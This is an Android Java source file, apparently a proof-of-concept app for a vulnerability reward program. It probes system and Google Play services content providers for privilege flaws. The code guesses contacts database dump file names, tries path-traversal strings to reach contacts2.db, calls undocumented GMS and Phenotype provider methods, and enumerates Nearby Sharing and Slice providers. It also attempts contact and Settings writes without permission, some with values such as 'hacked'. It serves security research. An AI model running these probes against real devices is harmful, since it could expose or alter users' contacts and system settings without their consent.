package com.vrp.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;

public class NovelVectorDeepActivity extends Activity {
    private static final String TAG = "NovelVectorDeep";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(5);
        logView.setText("Novel Deep Vector Scan\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n");
        logView.append("PKG: " + getPackageName() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runAllTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runAllTests() {
        testDumpFileProvider();
        testPhenotypeFlags();
        testContactsWriteEscalation();
        testGmsCallMethods();
        testSliceProviders();
        testNearbySharing();
        testSettingsWriteEscalation();
        log("\n=== ALL NOVEL DEEP TESTS COMPLETE ===");
    }

    private void testDumpFileProvider() {
        log("=== 1. ContactsProvider DumpFileProvider ===");
        log("Testing openFileDescriptor on debug dump provider...\n");

        String[] hexPrefixes = {
            "0", "1", "a", "ff", "0000", "ffff",
            "deadbeef", "12345678", "abcdef01",
            Long.toHexString(System.currentTimeMillis()),
            Long.toHexString(System.currentTimeMillis() / 1000),
            Long.toHexString(System.currentTimeMillis() - 86400000),
        };

        for (String hex : hexPrefixes) {
            String filename = hex + "-contacts-db.zip";
            Uri uri = Uri.parse("content://com.android.contacts.dumpfile/" + filename);
            try {
                Cursor c = getContentResolver().query(uri, null, null, null, null);
                if (c != null) {
                    if (c.moveToFirst()) {
                        String name = c.getString(c.getColumnIndex("_display_name"));
                        long size = c.getLong(c.getColumnIndex("_size"));
                        log("  [QUERY] " + filename + " name=" + name + " size=" + size);
                    }
                    c.close();
                }
            } catch (Exception e) {
                log("  [QUERY-ERR] " + filename + ": " + e.getClass().getSimpleName());
            }

            try {
                ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri, "r");
                if (pfd != null) {
                    long fileSize = pfd.getStatSize();
                    log("  [OPEN-SUCCESS!] " + filename + " size=" + fileSize);

                    InputStream is = getContentResolver().openInputStream(uri);
                    if (is != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buf = new byte[4096];
                        int n;
                        while ((n = is.read(buf)) > 0) baos.write(buf, 0, n);
                        byte[] data = baos.toByteArray();
                        log("  [DATA] Read " + data.length + " bytes");
                        if (data.length > 0) {
                            StringBuilder hexDump = new StringBuilder();
                            for (int i = 0; i < Math.min(64, data.length); i++) {
                                hexDump.append(String.format("%02x", data[i]));
                                if (i % 16 == 15) hexDump.append("\n    ");
                                else hexDump.append(" ");
                            }
                            log("  [HEX] " + hexDump);
                        }
                        is.close();
                    }
                    pfd.close();
                }
            } catch (java.io.FileNotFoundException e) {
                // expected — dump file doesn't exist
            } catch (SecurityException e) {
                log("  [SECURITY!] " + filename + ": " + e.getMessage());
            } catch (Exception e) {
                log("  [OPEN-ERR] " + filename + ": " + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }

        // Try path traversal
        log("\n  --- Path traversal tests ---");
        String[] traversals = {
            "../databases/contacts2.db",
            "../../shared_prefs/contacts.xml",
            "..%2fdatabases%2fcontacts2.db",
            "....//databases//contacts2.db",
        };
        for (String trav : traversals) {
            try {
                Uri uri = Uri.parse("content://com.android.contacts.dumpfile/" + trav);
                ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri, "r");
                if (pfd != null) {
                    log("  [TRAVERSAL-SUCCESS!] " + trav + " size=" + pfd.getStatSize());
                    pfd.close();
                }
            } catch (IllegalArgumentException e) {
                log("  [BLOCKED] " + trav + ": " + shorten(e.getMessage(), 60));
            } catch (java.io.FileNotFoundException e) {
                log("  [NOT-FOUND] " + trav);
            } catch (SecurityException e) {
                log("  [PERM-DENIED] " + trav);
            } catch (Exception e) {
                log("  [ERR] " + trav + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testPhenotypeFlags() {
        log("\n=== 2. Phenotype Feature Flags Provider ===");

        Uri phenotypeUri = Uri.parse("content://com.google.android.gms.phenotype");

        // Test call() with various methods and extras
        String[] methods = {"getFlags", "getCommitedFlagValues", "getExperimentTokens",
            "getSnapshot", "register", "getExperimentFlags", "getFlagOverrides"};

        for (String method : methods) {
            try {
                Bundle extras = new Bundle();
                extras.putString("packageName", "com.google.android.gms");
                Bundle result = getContentResolver().call(phenotypeUri, method, null, extras);
                if (result != null && !result.isEmpty()) {
                    log("  [CALL] " + method + ": keys=" + result.keySet());
                    for (String key : result.keySet()) {
                        Object val = result.get(key);
                        log("    " + key + "=" + (val != null ? val.getClass().getSimpleName() + ":" + shorten(val.toString(), 60) : "null"));
                    }
                } else {
                    log("  [CALL] " + method + ": null/empty");
                }
            } catch (SecurityException e) {
                log("  [SEC] " + method + ": " + shorten(e.getMessage(), 50));
            } catch (Exception e) {
                log("  [ERR] " + method + ": " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 50));
            }
        }

        // Try querying with specific package paths
        String[] packages = {"com.google.android.gms", "com.google.android.apps.messaging",
            "com.google.android.dialer", "com.google.android.apps.photos"};
        for (String pkg : packages) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.google.android.gms.phenotype/" + pkg),
                    null, null, null, null);
                if (c != null) {
                    log("  [QUERY] " + pkg + ": rows=" + c.getCount() + " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        String[] cols = c.getColumnNames();
                        for (int i = 0; i < Math.min(cols.length, 5); i++) {
                            try {
                                log("    " + cols[i] + "=" + shorten(c.getString(i), 40));
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (Exception e) {
                log("  [ERR] " + pkg + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testContactsWriteEscalation() {
        log("\n=== 3. ContactsProvider Write Escalation (READ_CONTACTS only) ===");

        // Test if READ_CONTACTS allows insert/update/delete
        ContentResolver cr = getContentResolver();

        // Test 1: Insert a raw contact
        try {
            ContentValues cv = new ContentValues();
            cv.put("account_type", "com.test");
            cv.put("account_name", "test@test.com");
            Uri result = cr.insert(Uri.parse("content://com.android.contacts/raw_contacts"), cv);
            if (result != null) {
                log("  [INSERT-RAW] SUCCESS! uri=" + result);
                // Delete it immediately
                try {
                    int deleted = cr.delete(result, null, null);
                    log("  [CLEANUP] Deleted " + deleted + " rows");
                } catch (Exception e) {
                    log("  [CLEANUP-ERR] " + e.getMessage());
                }
            }
        } catch (SecurityException e) {
            log("  [INSERT-RAW] BLOCKED: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("  [INSERT-RAW] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }

        // Test 2: Insert contact data
        try {
            ContentValues cv = new ContentValues();
            cv.put("raw_contact_id", 1);
            cv.put("mimetype", "vnd.android.cursor.item/phone_v2");
            cv.put("data1", "+10000000000");
            Uri result = cr.insert(Uri.parse("content://com.android.contacts/data"), cv);
            if (result != null) {
                log("  [INSERT-DATA] SUCCESS! uri=" + result);
            }
        } catch (SecurityException e) {
            log("  [INSERT-DATA] BLOCKED: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("  [INSERT-DATA] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }

        // Test 3: Update existing contact
        try {
            ContentValues cv = new ContentValues();
            cv.put("display_name", "HACKED");
            int updated = cr.update(Uri.parse("content://com.android.contacts/contacts/1"), cv, null, null);
            log("  [UPDATE] result=" + updated);
        } catch (SecurityException e) {
            log("  [UPDATE] BLOCKED: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("  [UPDATE] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }
    }

    private void testGmsCallMethods() {
        log("\n=== 4. GMS Provider call() Methods ===");

        // GMS Settings
        String[][] providers = {
            {"content://com.google.android.gms.settings.gms", "GMS Settings"},
            {"content://com.google.android.gms.settings.persistent", "GMS Persistent"},
            {"content://com.google.android.gms.thunderbird.config", "Thunderbird Config"},
        };

        String[] methods = {"get", "getAll", "put", "set", "list", "getSetting",
            "getConfig", "getVersion", "getMetadata"};

        for (String[] prov : providers) {
            log("  --- " + prov[1] + " ---");
            for (String method : methods) {
                try {
                    Bundle result = getContentResolver().call(Uri.parse(prov[0]), method, null, null);
                    if (result != null && !result.isEmpty()) {
                        log("  [" + method + "] keys=" + result.keySet());
                        for (String key : result.keySet()) {
                            Object val = result.get(key);
                            if (val != null) {
                                log("    " + key + "=" + shorten(val.toString(), 50));
                            }
                        }
                    }
                } catch (SecurityException e) {
                    log("  [" + method + "] SEC: " + shorten(e.getMessage(), 40));
                } catch (Exception e) {
                    // silently skip unrecognized methods
                }
            }
        }
    }

    private void testSliceProviders() {
        log("\n=== 5. SliceProvider Data Extraction ===");

        String[] sliceUris = {
            "content://com.google.android.gms.nearby.fastpair/",
            "content://com.google.android.gms.nearby.fastpair/devices",
            "content://com.google.android.apps.wellbeing.slices/",
            "content://com.android.settings.slices/",
            "content://com.android.settings.slices/action/wifi",
            "content://com.android.settings.slices/action/bluetooth",
            "content://com.android.settings.slices/action/airplane",
        };

        for (String uri : sliceUris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("  [SLICE] " + uri + " rows=" + c.getCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        String[] cols = c.getColumnNames();
                        StringBuilder sb = new StringBuilder("    cols=[");
                        for (String col : cols) sb.append(col).append(",");
                        log(sb.toString() + "]");
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("  [SLICE-SEC] " + uri.substring(uri.lastIndexOf('/')) + ": " + shorten(e.getMessage(), 40));
            } catch (Exception e) {
                log("  [SLICE-ERR] " + uri.substring(uri.lastIndexOf('/')));
            }
        }
    }

    private void testNearbySharing() {
        log("\n=== 6. Nearby Sharing Provider ===");

        String[] paths = {"", "/", "/devices", "/contacts", "/settings", "/transfers",
            "/sessions", "/files", "/metadata", "/history"};

        for (String path : paths) {
            try {
                Uri uri = Uri.parse("content://com.google.android.gms.nearby.sharing" + path);
                Cursor c = getContentResolver().query(uri, null, null, null, null);
                if (c != null) {
                    log("  [NS] " + path + " rows=" + c.getCount() + " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        String[] cols = c.getColumnNames();
                        for (int i = 0; i < Math.min(cols.length, 5); i++) {
                            try {
                                log("    " + cols[i] + "=" + shorten(c.getString(i), 40));
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                log("  [NS-SEC] " + path + ": " + shorten(e.getMessage(), 40));
            } catch (Exception e) {
                log("  [NS-ERR] " + path + ": " + e.getClass().getSimpleName());
            }
        }

        // Also try call() on nearby sharing
        try {
            Bundle result = getContentResolver().call(
                Uri.parse("content://com.google.android.gms.nearby.sharing"),
                "getDevices", null, null);
            if (result != null && !result.isEmpty()) {
                log("  [NS-CALL] getDevices: keys=" + result.keySet());
            }
        } catch (Exception e) {}
    }

    private void testSettingsWriteEscalation() {
        log("\n=== 7. Settings Provider Write Escalation ===");

        // Test if we can write to Settings.System without WRITE_SETTINGS
        try {
            ContentValues cv = new ContentValues();
            cv.put("name", "vrp_test_setting");
            cv.put("value", "test123");
            Uri result = getContentResolver().insert(
                Uri.parse("content://settings/system"), cv);
            if (result != null) {
                log("  [SYSTEM-INSERT] SUCCESS! uri=" + result);
                // Verify
                Cursor c = getContentResolver().query(
                    Uri.parse("content://settings/system/vrp_test_setting"),
                    null, null, null, null);
                if (c != null && c.moveToFirst()) {
                    log("  [VERIFIED] value=" + c.getString(c.getColumnIndex("value")));
                    c.close();
                }
                // Clean up
                getContentResolver().delete(
                    Uri.parse("content://settings/system/vrp_test_setting"), null, null);
            }
        } catch (SecurityException e) {
            log("  [SYSTEM-INSERT] BLOCKED: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("  [SYSTEM-INSERT] " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 60));
        }

        // Test Settings.Secure write
        try {
            ContentValues cv = new ContentValues();
            cv.put("name", "vrp_test_secure");
            cv.put("value", "hacked");
            Uri result = getContentResolver().insert(
                Uri.parse("content://settings/secure"), cv);
            if (result != null) {
                log("  [SECURE-INSERT] SUCCESS! uri=" + result);
            }
        } catch (SecurityException e) {
            log("  [SECURE-INSERT] BLOCKED: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("  [SECURE-INSERT] " + e.getClass().getSimpleName());
        }

        // Test Settings.Global write
        try {
            ContentValues cv = new ContentValues();
            cv.put("name", "vrp_test_global");
            cv.put("value", "hacked");
            Uri result = getContentResolver().insert(
                Uri.parse("content://settings/global"), cv);
            if (result != null) {
                log("  [GLOBAL-INSERT] SUCCESS! uri=" + result);
            }
        } catch (SecurityException e) {
            log("  [GLOBAL-INSERT] BLOCKED: " + shorten(e.getMessage(), 60));
        } catch (Exception e) {
            log("  [GLOBAL-INSERT] " + e.getClass().getSimpleName());
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
